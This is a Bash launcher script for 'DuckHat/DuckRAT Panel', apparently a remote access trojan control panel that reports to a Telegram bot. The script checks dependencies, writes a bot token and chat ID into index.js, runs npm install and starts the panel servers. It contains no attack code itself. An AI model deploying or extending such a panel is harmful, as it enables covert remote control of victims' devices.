#!/bin/bash

# ======== COLOR PALETTE ============== 
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
BOLD='\033[1m'
NC='\033[0m'

ORANGE='\033[0;33m'
LIGHT_BLUE='\033[1;34m'
LIGHT_GREEN='\033[1;32m'
GRAY='\033[0;37m'
DIM='\033[2m'

#============== ANIMATIONS ==============
animate_text() {
    local text="$1"
    local color="$2"
    local speed="${3:-0.03}"
    echo -n -e "${color}"
    for (( i=0; i<${#text}; i++ )); do
        echo -n "${text:$i:1}"
        sleep "$speed"
    done
    echo -e "${NC}"
}

progress_bar() {
    local current=$1
    local total=$2
    local width=30
    local percentage=$((current * 100 / total))
    local filled=$((current * width / total))

    printf "${DIM}Progress: ${NC}${CYAN}["
    for ((i=0; i<filled; i++)); do
        printf "█"
    done
    for ((i=filled; i<width; i++)); do
        printf "░"
    done
    printf "]${NC} ${BOLD}%d%%${NC}" $percentage
}

#============== ENHANCED PRINT FUNCTIONS ==============
print_status() {
    local status="$1"
    local message="$2"
    local timestamp=$(date '+%H:%M:%S')
    case "$status" in
        "success") echo -e "${DIM}[$timestamp]${NC} ${GREEN}✅ ${message}${NC}" ;;
        "error") echo -e "${DIM}[$timestamp]${NC} ${RED}❌ ${message}${NC}" ;;
        "warning") echo -e "${DIM}[$timestamp]${NC} ${YELLOW}⚠️  ${message}${NC}" ;;
        "info") echo -e "${DIM}[$timestamp]${NC} ${BLUE}ℹ️  ${message}${NC}" ;;
        "loading") echo -e "${DIM}[$timestamp]${NC} ${CYAN}🔄 ${message}${NC}" ;;
        "process") echo -e "${DIM}[$timestamp]${NC} ${PURPLE}⚙️  ${message}${NC}" ;;
    esac
}

print_header() {
    local title="$1"
    local color="$2"
    echo
    echo -e "${color}╔═════════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${color}║${NC}                              ${BOLD}${title}${NC}${color}                       ║${NC}"
    echo -e "${color}╚═════════════════════════════════════════════════════════════════════════════════╝${NC}"
    echo
}

print_section() {
    local title="$1"
    local color="${2:-$CYAN}"
    echo
    echo -e "${color}┌─ ${BOLD}${title}${NC}${color} ──────────────────────────────────────────────┐${NC}"
}

print_section_end() {
    local color="${1:-$CYAN}"
    echo -e "${color}└────────────────────────────────────────────────────────────────────────────────┘${NC}"
    echo
}

print_box() {
    local title="$1"
    local content="$2"
    local color="$3"

    echo -e "${color}╭─ ${BOLD}${title}${NC}${color} ────────────────────────────────────────────────────────────────╮${NC}"
    echo -e "${color}│${NC}"
    echo -e "${color}│${NC}  ${content}"
    echo -e "${color}│${NC}"
    echo -e "${color}╰────────────────────────────────────────────────────────────────────────────────╯${NC}"
}

print_info_line() {
    local label="$1"
    local value="$2"
    local color="${3:-$CYAN}"
    printf "${color}│${NC} ${BOLD}%-20s${NC} : ${WHITE}%-40s${NC} ${color}               │${NC}\n" "$label" "$value"
}

#============== UTILITY FUNCTIONS ==============
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

check_internet() {
    if ping -c 1 google.com &> /dev/null; then
        return 0
    else
        return 1
    fi
}

get_file_size() {
    local file="$1"
    if [[ -f "$file" ]]; then
        ls -lh "$file" | awk '{print $5}'
    else
        echo "N/A"
    fi
}

display_banner() {
    clear
    echo -e "${BOLD}${CYAN}"
    cat << "EOF"
    ╔═══════════════════════════════════════════════════════════════════════════════╗
    ║                                                                               ║
    ║     ██████╗ ██╗   ██╗ ██████╗██╗  ██╗██╗  ██╗ █████╗ ████████╗    ██╗   ██╗   ║
    ║     ██╔══██╗██║   ██║██╔════╝██║ ██╔╝██║  ██║██╔══██╗╚══██╔══╝    ██║   ██║   ║
    ║     ██║  ██║██║   ██║██║     █████╔╝ ███████║███████║   ██║       ██║   ██║   ║
    ║     ██║  ██║██║   ██║██║     ██╔═██╗ ██╔══██║██╔══██║   ██║       ╚██╗ ██╔╝   ║
    ║     ██████╔╝╚██████╔╝╚██████╗██║  ██╗██║  ██║██║  ██║   ██║        ╚████╔╝    ║
    ║     ╚═════╝  ╚═════╝  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝         ╚══╝      ║
    ║                                                                               ║
    ║                      🚀 DUCKHAT PANEL LAUNCHER v4.0 🚀                        ║
    ║                                                                               ║
    ║               💎 Professional Remote Access Control Panel                     ║
    ║               🔧 Advanced Telegram Bot Integration                            ║
    ║               ⚡ Enhanced Performance & Real-time Monitoring                  ║
    ║                                                                               ║
    ║                        Created by @izal_buyx - DuskCipher                     ║
    ║                           https://github.com/duskcipher                       ║
    ║                                                                               ║
    ╚═══════════════════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"

    animate_text "                       🔥 Initializing DuckHat Control Panel..." "$BOLD$GREEN" 0.04
    echo
    sleep 1.5
}

check_system_status() {
    print_header "SYSTEM STATUS & VERIFICATION" "$BOLD$CYAN"

    print_section "System Requirements Check     " "$CYAN"

    local checks=("Node.js" "NPM" "Internet" "Files" "Directories" "Permissions")
    local current=0
    local total=${#checks[@]}
    local failed_checks=()

    echo -e "${WHITE}┌─ Checking System Components ──────────────────────────────────────────────────┐${NC}"
    echo -e "${WHITE}│${NC}"

    # Node.js check
    ((current++))
    echo -e "${WHITE}│${NC} ${BLUE}[${current}/${total}]${NC} Checking Node.js runtime..."
    sleep 0.5
    if command_exists node; then
        local node_version=$(node --version)
        echo -e "${WHITE}│${NC} ${GREEN}✅ Node.js Runtime: ${BOLD}${node_version}${NC} ${GREEN}✓${NC}"
    else
        echo -e "${WHITE}│${NC} ${RED}❌ Node.js Runtime: Not installed ✗${NC}"
        failed_checks+=("Node.js")
    fi

    # NPM check
    ((current++))
    echo -e "${WHITE}│${NC} ${BLUE}[${current}/${total}]${NC} Checking NPM package manager..."
    sleep 0.5
    if command_exists npm; then
        local npm_version=$(npm --version)
        echo -e "${WHITE}│${NC} ${GREEN}✅ NPM Package Manager: ${BOLD}v${npm_version}${NC} ${GREEN}✓${NC}"
    else
        echo -e "${WHITE}│${NC} ${RED}❌ NPM Package Manager: Not installed ✗${NC}"
        failed_checks+=("NPM")
    fi

    # Internet check
    ((current++))
    echo -e "${WHITE}│${NC} ${BLUE}[${current}/${total}]${NC} Testing network connectivity..."
    sleep 0.5
    if check_internet; then
        echo -e "${WHITE}│${NC} ${GREEN}✅ Internet Connection: ${BOLD}Online${NC} ${GREEN}✓${NC}"
    else
        echo -e "${WHITE}│${NC} ${YELLOW}⚠️  Internet Connection: ${BOLD}Offline${NC} ${YELLOW}(Limited functionality)${NC}"
    fi

    # Files check
    ((current++))
    echo -e "${WHITE}│${NC} ${BLUE}[${current}/${total}]${NC} Verifying core application files..."
    sleep 0.5
    local required_files=("index.js" "package.json" "web-control.html")
    local missing_files=()

    for file in "${required_files[@]}"; do
        if [[ ! -f "$file" ]]; then
            missing_files+=("$file")
        fi
    done

    if [[ ${#missing_files[@]} -eq 0 ]]; then
        echo -e "${WHITE}│${NC} ${GREEN}✅ Core Files: ${BOLD}All ${#required_files[@]} files present${NC} ${GREEN}✓${NC}"
    else
        echo -e "${WHITE}│${NC} ${RED}❌ Missing files: ${missing_files[*]} ✗${NC}"
        failed_checks+=("Files")
    fi

    # Directories check
    ((current++))
    echo -e "${WHITE}│${NC} ${BLUE}[${current}/${total}]${NC} Checking required directories..."
    sleep 0.5
    local dirs=("uploadedFile" "logs" "temp" "config")
    local created_dirs=()

    for dir in "${dirs[@]}"; do
        if [[ ! -d "$dir" ]]; then
            mkdir -p "$dir"
            created_dirs+=("$dir")
        fi
    done

    if [[ ${#created_dirs[@]} -gt 0 ]]; then
        echo -e "${WHITE}│${NC} ${GREEN}✅ Directories: ${BOLD}Created ${created_dirs[*]}${NC} ${GREEN}✓${NC}"
    else
        echo -e "${WHITE}│${NC} ${GREEN}✅ Directories: ${BOLD}All exist${NC} ${GREEN}✓${NC}"
    fi

    # Permissions check
    ((current++))
    echo -e "${WHITE}│${NC} ${BLUE}[${current}/${total}]${NC} Checking file permissions..."
    sleep 0.5
    if [[ -w "." ]]; then
        echo -e "${WHITE}│${NC} ${GREEN}✅ Write Permissions: ${BOLD}Working directory writable${NC} ${GREEN}✓${NC}"
    else
        echo -e "${WHITE}│${NC} ${RED}❌ Write Permissions: Insufficient permissions ✗${NC}"
        failed_checks+=("Permissions")
    fi

    echo -e "${WHITE}│${NC}"
    echo -e "${WHITE}└────────────────────────────────────────────────────────────────────────────────┘${NC}"

    # File details section
    if [[ ${#missing_files[@]} -eq 0 ]]; then
        echo
        echo -e "${GRAY}┌─ File Information ─────────────────────────────────────────────────────────────┐${NC}"
        for file in "${required_files[@]}"; do
            local size=$(get_file_size "$file")
            echo -e "${GRAY}│${NC} ${BOLD}${file}${NC} ${GRAY}→${NC} ${WHITE}${size}${NC}"
        done
        echo -e "${GRAY}└────────────────────────────────────────────────────────────────────────────────┘${NC}"
    fi

    print_section_end "$CYAN"

    # Summary with better formatting
    echo
    if [[ ${#failed_checks[@]} -eq 0 ]]; then
        echo -e "${GREEN}╭─ System Status ────────────────────────────────────────────────────────────────╮${NC}"
        echo -e "${GREEN}│${NC} ${BOLD}🎉 All system checks passed! Ready to proceed.${NC}                                 ${GREEN}│${NC}"
        echo -e "${GREEN}╰────────────────────────────────────────────────────────────────────────────────╯${NC}"
        return 0
    else
        echo -e "${RED}╭─ System Status ────────────────────────────────────────────────────────────────╮${NC}"
        echo -e "${RED}│${NC} ${BOLD}❌ Failed checks: ${failed_checks[*]}${NC}                                     ${RED}│${NC}"
        echo -e "${RED}│${NC} ${BOLD}💡 Run 'bash install.sh' to fix missing dependencies${NC}                    ${RED}│${NC}"
        echo -e "${RED}╰────────────────────────────────────────────────────────────────────────────────╯${NC}"
        return 1
    fi
}

get_user_input() {
    print_header "TELEGRAM BOT CONFIGURATION  "   "$BOLD$YELLOW"

echo -e "${YELLOW}╭─ Bot Setup Wizard ──────────────────────────────────────────────────────────────╮${NC}"
echo -e "${YELLOW}│${WHITE}  Configure your Telegram bot credentials for remote access${YELLOW}                      │${NC}"
echo -e "${YELLOW}╰─────────────────────────────────────────────────────────────────────────────────╯${NC}"

    print_section "Step 1: Bot Token Configuration" "$YELLOW"
    echo -e "${CYAN}🤖 Enter your Telegram Bot Token:${NC}"
    echo -e "${DIM}   Get this from @BotFather on Telegram${NC}"
    echo

    while true; do
        read -p "🔑 Bot Token: " BOT_TOKEN

        if [[ -z "$BOT_TOKEN" ]]; then
            print_status "error" "Bot token cannot be empty!"
            continue
        fi

        if [[ ! "$BOT_TOKEN" =~ ^[0-9]+:[A-Za-z0-9_-]+$ ]]; then
            print_status "error" "Invalid token format! Should be: 123456789:ABC-DEF..."
            continue
        fi

        print_status "success" "Valid token format detected ✓"
        break
    done

    print_section_end "$YELLOW"

    print_section "Step 2: Chat ID Configuration  " "$YELLOW"
    echo -e "${CYAN}🆔 Enter your Telegram Chat ID:${NC}"
    echo -e "${DIM}   Your personal chat ID or group chat ID${NC}"
    echo

    while true; do
        read -p "🆔 Chat ID: " CHAT_ID

        if [[ -z "$CHAT_ID" ]]; then
            print_status "error" "Chat ID cannot be empty!"
            continue
        fi

        if ! [[ "$CHAT_ID" =~ ^-?[0-9]+$ ]]; then
            print_status "error" "Chat ID must be numeric! (e.g., 123456789 or -123456789)"
            continue
        fi

        print_status "success" "Valid Chat ID format detected ✓"
        break
    done

    print_section_end "$YELLOW"

    # Configuration Summary
    print_section "Configuration Summary          " "$GREEN"
    print_info_line "Bot Token" "${BOT_TOKEN:0:15}...${BOT_TOKEN: -10}"                     "$GREEN"
    print_info_line "Chat ID" "$CHAT_ID"                     "$GREEN"
    print_info_line "Status" "Ready for deployment"                   "$GREEN"
    print_section_end "$GREEN"

    echo -e "${BOLD}${GREEN}✅ Confirm this configuration? ${NC}${DIM}(Y/n)${NC}: "
    read -r CONFIRM
    if [[ "$CONFIRM" =~ ^[Nn]$ ]]; then
        print_status "warning" "Configuration cancelled by user"
        return 1
    fi

    print_status "success" "🎉 Configuration confirmed!"
    return 0
}

update_config() {
    print_header "CONFIGURATION UPDATE        " "$BOLD$PURPLE"

    print_section "Updating Application Config    " "$PURPLE"

    if [[ ! -f "index.js" ]]; then
        print_status "error" "Core file index.js not found!"
        return 1
    fi

    # Create timestamped backup
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local backup_name="index.js.backup.$timestamp"

    print_status "loading" "Creating configuration backup..."
    if cp index.js "$backup_name"; then
        print_status "success" "Backup created: $backup_name ✓"
    else
        print_status "error" "Failed to create backup!"
        return 1
    fi

    # Update bot token
    print_status "loading" "Updating bot token configuration..."
    if sed -i.tmp "s/const token = ['\"][^'\"]*['\"];/const token = '$BOT_TOKEN';/" index.js; then
        print_status "success" "Bot token updated successfully ✓"
    else
        print_status "error" "Failed to update bot token!"
        return 1
    fi

    # Update chat ID
    print_status "loading" "Updating chat ID configuration..."
    if sed -i.tmp "s/const id = ['\"][^'\"]*['\"];/const id = '$CHAT_ID';/" index.js; then
        print_status "success" "Chat ID updated successfully ✓"
    else
        print_status "error" "Failed to update chat ID!"
        return 1
    fi

    # Cleanup
    rm -f index.js.tmp

    print_section_end "$PURPLE"

    print_status "success" "🎉 Configuration update completed!"
    return 0
}

install_dependencies() {
    print_header "DEPENDENCY MANAGEMENT" "$BOLD$GREEN"

    print_section "Package Installation" "$GREEN"

    if [[ ! -f "package.json" ]]; then
        print_status "error" "package.json not found!"
        return 1
    fi

    print_status "loading" "Analyzing package.json..."

    # Show package info
    if command_exists jq && [[ -f "package.json" ]]; then
        local pkg_name=$(jq -r '.name // "Unknown"' package.json)
        local pkg_version=$(jq -r '.version // "Unknown"' package.json)
        print_info_line "Package Name" "$pkg_name" "$GREEN"
        print_info_line "Version" "$pkg_version" "$GREEN"
    fi

    print_status "loading" "Installing dependencies via NPM..."
    echo

    # Progress simulation for installation
    local deps=("express" "body-parser" "multer" "fs-extra" "path" "crypto")
    local current=0
    local total=${#deps[@]}

    if npm install > /tmp/npm_install.log 2>&1; then
        print_status "success" "Dependencies installed successfully ✓"

        # Show installation summary
        local node_modules_size=$(du -sh node_modules 2>/dev/null | cut -f1 || echo "N/A")
        local package_count=$(ls node_modules 2>/dev/null | wc -l || echo "0")

        print_section "Installation Summary" "$LIGHT_GREEN"
        print_info_line "Total Packages" "$package_count" "$LIGHT_GREEN"
        print_info_line "Installation Size" "$node_modules_size" "$LIGHT_GREEN"
        print_info_line "Cache Location" "~/.npm" "$LIGHT_GREEN"
        print_section_end "$LIGHT_GREEN"

    else
        print_status "error" "Installation failed!"
        print_status "info" "Check /tmp/npm_install.log for error details"
        return 1
    fi

    return 0
}

start_server() {
    print_header "DUCKHAT PANEL LAUNCHER      " "$BOLD$LIGHT_GREEN"

    print_section "Server Configuration           " "$LIGHT_GREEN"
    print_info_line "Panel URL" "http://0.0.0.0:5000" "$LIGHT_GREEN"
    print_info_line "Control Interface" "http://0.0.0.0:5000/web-control" "$LIGHT_GREEN"
    print_info_line "File Manager" "http://0.0.0.0:5000/uploadedFile" "$LIGHT_GREEN"
    print_info_line "Protocol" "HTTP/1.1" "$LIGHT_GREEN"
    print_info_line "Environment" "Production Ready" "$LIGHT_GREEN"
    print_section_end "$LIGHT_GREEN"

    print_section "Pre-Launch Checklist           " "$CYAN"

    local checklist=("Configuration" "Dependencies" "Network" "Permissions")
    for item in "${checklist[@]}"; do
        print_status "success" "$item: Ready ✓"
        sleep 0.3
    done

    print_section_end "$CYAN"

    # Animated countdown
    print_status "loading" "Initializing server components..."
    echo

    for i in {5..1}; do
        echo -e "${CYAN}🚀 Launching in ${BOLD}$i${NC}${CYAN} seconds...${NC}"
        sleep 1
    done

    echo
    echo -e "${GREEN}🚀 Starting DuckRAT Panel...${NC}"
    echo -e "${BLUE}📊 Server will be available at: http://localhost:5000${NC}"
    echo -e "${PURPLE}🤖 Admin Bot will start automatically${NC}"
    echo ""

    # Start admin bot in background
    echo -e "${CYAN}Starting Admin Bot...${NC}"
    node admin-bot.js &
    ADMIN_PID=$!

    # Start the main application
    echo -e "${CYAN}Starting Main Server...${NC}"
    node index.js &
    MAIN_PID=$!

    # Wait for both processes
    wait $ADMIN_PID $MAIN_PID
}

cleanup() {
    echo
    echo
    print_status "warning" "🛑 Shutdown signal received..."
    print_status "loading" "Gracefully stopping DuckHat Panel..."
    sleep 1

    print_box "Session Comp" "👋 Thank you for using DuckHat Panel v4.0!" "$CYAN"

    print_status "info" "💾 Session data saved"
    print_status "info" "🔒 Connections terminated securely"
    print_status "success" "✅ Clean shutdown completed"

    exit 0
}

# Trap signals for clean shutdown
trap cleanup SIGINT SIGTERM

main() {
    # Initialize
    display_banner

    # System verification
    if ! check_system_status; then
        print_status "error" "❌ System requirements not met!"
        print_status "info" "💡 Run 'bash install.sh' to setup your environment"
        echo
        print_box "Installation Required" "Please run the installer first: bash install.sh" "$RED"
        exit 1
    fi

    # Get configuration
    if ! get_user_input; then
        print_status "error" "❌ Configuration setup was cancelled!"
        exit 1
    fi

    # Update configuration
    if ! update_config; then
        print_status "error" "❌ Failed to update configuration files!"
        exit 1
    fi

    # Handle dependencies
    if [[ ! -d "node_modules" ]]; then
        print_status "info" "📦 Dependencies not found, installing..."
        if ! install_dependencies; then
            print_status "error" "❌ Dependency installation failed!"
            exit 1
        fi
    else
        print_status "success" "📦 Dependencies already installed ✓"
    fi

    # Launch server
    start_server
}

# Execute main function
main "$@"